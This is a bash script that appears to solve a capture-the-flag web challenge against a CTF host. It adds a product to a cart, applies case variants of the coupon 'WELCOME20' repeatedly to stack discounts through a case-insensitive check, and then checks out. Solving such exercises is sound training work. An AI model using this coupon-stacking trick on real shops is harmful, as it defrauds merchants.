#!/usr/bin/env bash
set -euo pipefail

target="${1:-https://a0fa8a95c8c592ce.chal.ctf.ae}"
cookie_file="${TMPDIR:-/tmp}/coupon-collector-cookies.$$"

cleanup() {
  rm -f "$cookie_file"
}
trap cleanup EXIT

curl_flags=(-sS -k -c "$cookie_file" -b "$cookie_file" -H "Content-Type: application/json")

echo "[*] Adding product 3 to the cart"
curl "${curl_flags[@]}" \
  -X POST "$target/api/cart" \
  -d '{"product_id":3}'
echo

for coupon in WELCOME20 welcome20 Welcome20 WElcome20 WeLcome20; do
  echo "[*] Applying coupon variant: $coupon"
  curl "${curl_flags[@]}" \
    -X POST "$target/api/apply-coupon" \
    -d "{\"coupon\":\"$coupon\"}"
  echo
done

echo "[*] Checking out"
curl "${curl_flags[@]}" \
  -X POST "$target/api/checkout" \
  -d '{}'
echo
